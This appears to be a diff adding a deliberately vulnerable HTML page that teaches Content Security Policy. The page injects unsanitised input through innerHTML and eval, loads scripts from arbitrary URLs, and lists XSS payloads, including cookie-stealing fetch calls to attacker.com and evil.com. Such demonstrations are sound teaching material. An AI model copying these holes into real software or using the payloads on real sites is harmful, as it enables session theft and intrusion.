@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>No CSP - Vulnerable Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header { background: #f44336; color: white; padding: 20px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
+        .warning { background: #ffebee; border: 1px solid #f44336; padding: 15px; border-radius: 4px; margin-bottom: 20px; color: #c62828; }
+        .demo-section { background: #f9f9f9; padding: 20px; border-radius: 8px; margin: 20px 0; }
+        .attack-demo { background: #fff3e0; padding: 15px; border-radius: 4px; margin: 20px 0; border: 2px dashed #ff9800; }
+        .code-example { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 4px; margin: 10px 0; overflow-x: auto; font-family: 'Courier New', monospace; }
+        .btn { padding: 10px 20px; background: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
+        .btn:hover { background: #d32f2f; }
+        .input-field { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin: 10px 0; box-sizing: border-box; }
+        .vulnerable-content { border: 2px solid #f44336; padding: 15px; margin: 10px 0; background: #ffebee; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚨 No CSP Protection - Vulnerable Website</h1>
+            <p>This page has NO Content Security Policy - Everything is allowed!</p>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ Security Risk:</strong> This page has no CSP protection!
+            <br>Any script from any source can execute. This demonstrates why CSP is crucial.
+        </div>
+
+        <!-- Current CSP Status -->
+        <div class="demo-section">
+            <h3>🔍 Current Security Status</h3>
+            <p><strong>Content Security Policy:</strong> <span style="color: #f44336; font-weight: bold;">NONE</span></p>
+            <p><strong>Inline Scripts:</strong> <span style="color: #f44336;">✅ Allowed (Dangerous)</span></p>
+            <p><strong>External Scripts:</strong> <span style="color: #f44336;">✅ Allowed from ANY domain (Very Dangerous)</span></p>
+            <p><strong>eval() Function:</strong> <span style="color: #f44336;">✅ Allowed (Extremely Dangerous)</span></p>
+            <p><strong>Inline Styles:</strong> <span style="color: #f44336;">✅ Allowed</span></p>
+            
+            <button class="btn" onclick="checkCSPStatus()">Check CSP Headers</button>
+        </div>
+
+        <!-- Vulnerability Demonstrations -->
+        <div class="attack-demo">
+            <h3>💀 Attack Demonstrations (All Will Work!)</h3>
+            
+            <h4>1. Inline Script Injection</h4>
+            <p>Try entering malicious scripts in this input:</p>
+            <input type="text" class="input-field" id="userInput" placeholder="Enter content (try: &lt;script&gt;alert('XSS')&lt;/script&gt;)">
+            <button class="btn" onclick="displayUserInput()">Display Content</button>
+            <div id="outputArea" class="vulnerable-content">Output will appear here...</div>
+
+            <h4>2. External Script Loading</h4>
+            <p>Load external scripts from any domain:</p>
+            <input type="text" class="input-field" id="scriptUrl" placeholder="Enter script URL (try: https://code.jquery.com/jquery-3.6.0.min.js)" value="https://code.jquery.com/jquery-3.6.0.min.js">
+            <button class="btn" onclick="loadExternalScript()">Load External Script</button>
+            <div id="scriptStatus">No external scripts loaded yet...</div>
+
+            <h4>3. eval() Function Usage</h4>
+            <p>Execute dynamic JavaScript code:</p>
+            <input type="text" class="input-field" id="evalCode" placeholder="Enter JavaScript code (try: alert('eval executed!'))" value="document.body.style.background = 'red'">
+            <button class="btn" onclick="executeEval()">Execute eval()</button>
+
+            <h4>4. Inline Event Handlers</h4>
+            <p>Dynamic HTML with event handlers:</p>
+            <input type="text" class="input-field" id="htmlContent" placeholder="Enter HTML (try: &lt;img src=x onerror=alert('Event handler XSS')&gt;)" value="<button onclick='alert(\"Inline event executed!\")'>Click me</button>">
+            <button class="btn" onclick="insertHTML()">Insert HTML</button>
+            <div id="htmlOutput" class="vulnerable-content">HTML output will appear here...</div>
+        </div>
+
+        <!-- Pre-loaded Vulnerabilities -->
+        <div class="demo-section">
+            <h3>🎯 Pre-loaded Attack Examples</h3>
+            <p>These attacks are already active on this page:</p>
+
+            <!-- Vulnerable inline script -->
+            <div class="vulnerable-content">
+                <h4>Active Inline Script:</h4>
+                <div class="code-example">
+&lt;script&gt;
+    console.log('🚨 Inline script executed without CSP protection!');
+    // This could be malicious code from an attacker
+&lt;/script&gt;
+                </div>
+            </div>
+
+            <!-- Vulnerable external resource -->
+            <div class="vulnerable-content">
+                <h4>External Resource Loading:</h4>
+                <p>Loading image from external domain (could be tracking pixel):</p>
+                <img src="https://via.placeholder.com/100x50/ff0000/ffffff?text=External" alt="External Resource" style="border: 2px solid #f44336;">
+                <p><small>In a real attack, this could be a malicious domain!</small></p>
+            </div>
+
+            <!-- Vulnerable form -->
+            <div class="vulnerable-content">
+                <h4>Unprotected Form Submission:</h4>
+                <form onsubmit="return false;">
+                    <input type="text" placeholder="This form has no CSP protection" class="input-field">
+                    <button type="submit" class="btn">Submit (Vulnerable)</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Attack Vectors -->
+        <div class="demo-section">
+            <h3>⚔️ Common Attack Vectors That Work Without CSP</h3>
+            
+            <div class="code-example">
+&lt;!-- 1. Script injection in user input --&gt;
+&lt;script&gt;
+    // Steal cookies
+    fetch('https://attacker.com/steal?cookies=' + document.cookie);
+&lt;/script&gt;
+
+&lt;!-- 2. External malicious script --&gt;
+&lt;script src="https://evil-cdn.com/malware.js"&gt;&lt;/script&gt;
+
+&lt;!-- 3. Image with malicious onerror --&gt;
+&lt;img src="invalid" onerror="eval('malicious code')"&gt;
+
+&lt;!-- 4. Form hijacking --&gt;
+&lt;form action="https://attacker.com/phish" method="post"&gt;
+
+&lt;!-- 5. Iframe injection --&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;
+            </div>
+
+            <h4>🔥 Try These Payloads:</h4>
+            <ul>
+                <li><code>&lt;script&gt;alert('No CSP = Easy XSS!')&lt;/script&gt;</code></li>
+                <li><code>&lt;img src=x onerror=document.body.innerHTML='Hacked!'&gt;</code></li>
+                <li><code>&lt;iframe src="javascript:alert('Frame injection')"&gt;&lt;/iframe&gt;</code></li>
+                <li><code>&lt;svg onload=fetch('//evil.com/steal?data='+document.cookie)&gt;</code></li>
+            </ul>
+        </div>
+
+        <!-- Fix Recommendations -->
+        <div style="margin-top: 30px; padding: 20px; background: #e8f5e8; border-radius: 8px; border-left: 4px solid #4caf50;">
+            <h3>🛡️ How CSP Would Fix These Issues</h3>
+            <p>With a proper Content Security Policy, all these attacks would be blocked:</p>
+            
+            <div class="code-example">
+&lt;!-- Basic CSP Header --&gt;
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
+
+&lt;!-- What this blocks: --&gt;
+❌ Inline scripts (like the ones above)
+❌ External scripts from unauthorized domains  
+❌ eval() function execution
+❌ Inline event handlers (onclick, onerror, etc.)
+❌ javascript: URLs in iframes
+
+&lt;!-- What this allows: --&gt;
+✅ Scripts from same origin only
+✅ Stylesheets from same origin + inline styles
+✅ Images, fonts, etc. from same origin
+            </div>
+
+            <p><strong>Next:</strong> Check out our CSP-protected examples to see the difference!</p>
+            <ul>
+                <li><a href="basic-csp.html">Basic CSP Protection</a></li>
+                <li><a href="strict-csp.html">Strict CSP with Nonces</a></li>
+                <li><a href="csp-report-only.html">CSP Report-Only Mode</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Inline script that would be blocked by CSP -->
+    <script>
+        console.log('🚨 Inline script executed without CSP protection!');
+        console.log('🎯 This demonstrates why CSP is essential for web security');
+
+        function displayUserInput() {
+            const input = document.getElementById('userInput').value;
+            const output = document.getElementById('outputArea');
+            
+            // 🚨 DANGEROUS: Direct HTML insertion without CSP protection
+            output.innerHTML = input;
+            console.log('🚨 User input inserted without sanitization:', input);
+        }
+
+        function loadExternalScript() {
+            const url = document.getElementById('scriptUrl').value;
+            const script = document.createElement('script');
+            script.src = url;
+            script.onload = function() {
+                document.getElementById('scriptStatus').innerHTML = 
+                    `✅ External script loaded from: <code>${url}</code><br>
+                     <small>Without CSP, any domain can be loaded!</small>`;
+                console.log('🚨 External script loaded from:', url);
+            };
+            script.onerror = function() {
+                document.getElementById('scriptStatus').innerHTML = 
+                    `❌ Failed to load script from: <code>${url}</code>`;
+            };
+            
+            document.head.appendChild(script);
+        }
+
+        function executeEval() {
+            const code = document.getElementById('evalCode').value;
+            try {
+                // 🚨 DANGEROUS: eval() execution without CSP protection
+                eval(code);
+                console.log('🚨 eval() executed without CSP protection:', code);
+                alert('eval() executed successfully! (This would be blocked by CSP)');
+            } catch (error) {
+                alert('Error in eval(): ' + error.message);
+            }
+        }
+
+        function insertHTML() {
+            const html = document.getElementById('htmlContent').value;
+            const output = document.getElementById('htmlOutput');
+            
+            // 🚨 DANGEROUS: HTML insertion with potential event handlers
+            output.innerHTML = html;
+            console.log('🚨 HTML with potential event handlers inserted:', html);
+        }
+
+        function checkCSPStatus() {
+            // Check if CSP headers are present
+            const cspHeader = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+            const cspReportHeader = document.querySelector('meta[http-equiv="Content-Security-Policy-Report-Only"]');
+            
+            if (!cspHeader && !cspReportHeader) {
+                alert('❌ No CSP headers detected!\nThis page is vulnerable to script injection attacks.');
+            } else {
+                alert('✅ CSP headers found:\n' + 
+                      (cspHeader ? 'CSP: ' + cspHeader.content + '\n' : '') +
+                      (cspReportHeader ? 'CSP-Report-Only: ' + cspReportHeader.content : ''));
+            }
+        }
+
+        // Demonstrate potential attack vectors
+        window.addEventListener('load', function() {
+            console.log('🚨 Page loaded without CSP protection');
+            console.log('🎯 All inline scripts, external resources, and eval() are allowed');
+            console.log('⚠️  In a real attack, malicious scripts could now:');
+            console.log('   - Steal authentication tokens');
+            console.log('   - Redirect to phishing sites');
+            console.log('   - Inject malicious content');
+            console.log('   - Access sensitive data');
+        });
+
+        // Simulate tracking script (would be blocked by CSP)
+        (function() {
+            console.log('📊 Simulated tracking script executing...');
+            console.log('🚨 Without CSP, any external script can track users');
+        })();
+    </script>
+
+    <!-- External script inclusion (would be controlled by CSP) -->
+    <script>
+        // This simulates loading an external analytics script
+        console.log('📈 External analytics script would load here');
+        console.log('🚨 CSP would control which external scripts are allowed');
+    </script>
+</body>
+</html> 
